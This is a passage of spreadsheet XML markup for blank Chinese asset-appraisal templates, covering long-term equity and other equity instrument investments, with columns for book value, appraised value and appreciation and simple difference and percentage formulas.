          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-H6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(H6=0,"",J6/H6*100)</f>
        <v/>
      </c>
      <c r="L6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-H7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(H7=0,"",J7/H7*100)</f>
        <v/>
      </c>
      <c r="L7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-H8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(H8=0,"",J8/H8*100)</f>
        <v/>
      </c>
      <c r="L8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-H9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(H9=0,"",J9/H9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-H10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(H10=0,"",J10/H10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-H11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(H11=0,"",J11/H11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-H12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(H12=0,"",J12/H12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-H13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(H13=0,"",J13/H13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-H14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(H14=0,"",J14/H14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-H15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(H15=0,"",J15/H15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-H16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(H16=0,"",J16/H16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-H17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(H17=0,"",J17/H17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-H18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(H18=0,"",J18/H18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-H19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(H19=0,"",J19/H19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-H20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(H20=0,"",J20/H20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-H21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(H21=0,"",J21/H21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-H22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(H22=0,"",J22/H22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-H23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(H23=0,"",J23/H23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-H24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(H24=0,"",J24/H24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>I25-H25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(H25=0,"",J25/H25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-H26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(H26=0,"",J26/H26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="115" t="n"/>
      <c r="G27" s="555">
        <f>ROUND(SUM(G6:G26),2)</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>ROUND(SUM(H6:H26),2)</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>ROUND(SUM(I6:I26),2)</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>I27-H27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(H27=0,"",J27/H27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>减：长期股权投资减值准备</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="115" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555">
        <f>I28-H28</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>IF(H28=0,"",J28/H28*100)</f>
        <v/>
      </c>
      <c r="L28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="380" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="115" t="n"/>
      <c r="G29" s="555">
        <f>G27-G28</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>H27-H28</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>I27-I28</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>I29-H29</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>IF(H29=0,"",J29/H29*100)</f>
        <v/>
      </c>
      <c r="L29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="K3:L3"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:L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7222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="87" fitToHeight="0" blackAndWhite="1"/>
  <headerFooter scaleWithDoc="0"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 codeName="Sheet45">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:K29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="13.6666666666667" customWidth="1" style="410" min="1" max="1"/>
    <col width="8.16666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="20.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="12" customWidth="1" style="410" min="4" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="8" max="9"/>
    <col outlineLevel="1" width="11.8333333333333" customWidth="1" style="410" min="10" max="10"/>
    <col width="9.16666666666667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其他权益工具投资评估明细表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402" t="inlineStr">
        <is>
          <t>表4-5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176" t="n"/>
      <c r="J4" s="176" t="n"/>
      <c r="K4" s="176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被投资单位名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>投资日期</t>
        </is>
      </c>
      <c r="E5" s="185" t="inlineStr">
        <is>
          <t>投资数量</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>投资成本</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="H5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="I5" s="170" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="580" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555">
        <f>H6-G6</f>
        <v/>
      </c>
      <c r="J6" s="555">
        <f>IF(G6=0,"",I6/G6*100)</f>
        <v/>
      </c>
      <c r="K6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="580" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="580" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="580" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="580" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="580" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="580" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="580" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="580" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="580" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="580" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="580" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="580" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="580" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="580" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="580" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="580" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="580" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="580" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="580" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
